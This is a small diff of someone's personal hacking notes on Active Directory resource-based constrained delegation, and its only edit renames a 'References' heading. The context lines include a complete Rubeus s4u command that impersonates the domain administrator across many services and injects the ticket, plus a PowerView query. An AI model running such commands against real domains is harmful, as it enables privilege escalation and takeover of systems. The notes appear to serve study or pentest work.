@@ -31,7 +31,7 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 .\rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:HASH_HERE /aes128:HASH_HERE /rc4:HASH_HERE /impersonateuser:administrator /msdsspn:cifs/FQDNMachine.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
-# References
+# Related
 - [20221003151148](/zet/20221003151148/README.md) resource based constrained delegation S4U attack
 - ~/kb/hacking/windows/AD-resource-based-constrained-delegation-attack.md
 
